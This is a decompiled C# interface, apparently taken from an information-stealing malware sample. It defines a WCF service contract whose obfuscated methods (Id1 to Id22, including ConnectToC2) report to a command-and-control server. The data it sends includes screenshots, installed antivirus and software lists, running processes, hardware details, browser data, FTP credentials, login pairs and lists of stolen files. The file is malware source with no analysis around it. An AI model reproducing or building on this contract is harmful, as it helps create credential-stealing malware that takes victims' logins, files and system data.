using System;
using System.Collections.Generic;
using System.ServiceModel;

// Token: 0x02000039 RID: 57
[ServiceContract(Name = "Entity", SessionMode = SessionMode.Required)]
public interface Entity
{
	// Token: 0x0600016F RID: 367
	[OperationContract(Name = "Id1")]
	bool ConnectToC2();

	// Token: 0x06000170 RID: 368
	[OperationContract(Name = "Id2")]
	Entity_Settings Id2();

	// Token: 0x06000171 RID: 369
	[OperationContract(Name = "Id3")]
	void Id3(Entity_CollectedResults user);

	// Token: 0x06000172 RID: 370
	[OperationContract(Name = "Id4")]
	Entity_ServerResponse Id4(Entity_CollectedResults user);

	// Token: 0x06000173 RID: 371
	[OperationContract(Name = "Id5")]
	Entity_ServerResponse Id5(byte[] display);

	// Token: 0x06000174 RID: 372
	[OperationContract(Name = "Id6")]
	Entity_ServerResponse Id6(List<string> defenders);

	// Token: 0x06000175 RID: 373
	[OperationContract(Name = "Id7")]
	Entity_ServerResponse Id7(List<string> languages);

	// Token: 0x06000176 RID: 374
	[OperationContract(Name = "Id8")]
	Entity_ServerResponse Id8(List<string> softwares);

	// Token: 0x06000177 RID: 375
	[OperationContract(Name = "Id9")]
	Entity_ServerResponse Id9(List<string> processes);

	// Token: 0x06000178 RID: 376
	[OperationContract(Name = "Id10")]
	Entity_ServerResponse Id10(List<Entity_HardwareInfo> hardwares);

	// Token: 0x06000179 RID: 377
	[OperationContract(Name = "Id11")]
	Entity_ServerResponse Id11(List<Entity_Browser> browsers);

	// Token: 0x0600017A RID: 378
	[OperationContract(Name = "Id12")]
	Entity_ServerResponse Id12(List<Entity_LoginData> ftps);

	// Token: 0x0600017B RID: 379
	[OperationContract(Name = "Id13")]
	Entity_ServerResponse Id13(List<BrowserInfo> installedBrowsers);

	// Token: 0x0600017C RID: 380
	[OperationContract(Name = "Id14")]
	Entity_ServerResponse Id14(List<Entity_StolenFile> remoteFiles);

	// Token: 0x0600017D RID: 381
	[OperationContract(Name = "Id15")]
	Entity_ServerResponse Id15(List<Entity_StolenFile> remoteFiles);

	// Token: 0x0600017E RID: 382
	[OperationContract(Name = "Id16")]
	Entity_ServerResponse Id16(List<Entity_StolenFile> remoteFiles);

	// Token: 0x0600017F RID: 383
	[OperationContract(Name = "Id17")]
	Entity_ServerResponse Id17(List<Entity_LoginData> loginPairs);

	// Token: 0x06000180 RID: 384
	[OperationContract(Name = "Id18")]
	Entity_ServerResponse Id18(List<Entity_StolenFile> remoteFiles);

	// Token: 0x06000181 RID: 385
	[OperationContract(Name = "Id19")]
	Entity_ServerResponse Id19(List<Entity_StolenFile> remoteFiles);

	// Token: 0x06000182 RID: 386
	[OperationContract(Name = "Id20")]
	Entity_ServerResponse Id20(List<Entity_StolenFile> remoteFiles);

	// Token: 0x06000183 RID: 387
	[OperationContract(Name = "Id21")]
	Entity_ServerResponse Id21(List<Entity_StolenFile> remoteFiles);

	// Token: 0x06000184 RID: 388
	[OperationContract(Name = "Id22")]
	void Id22();
}
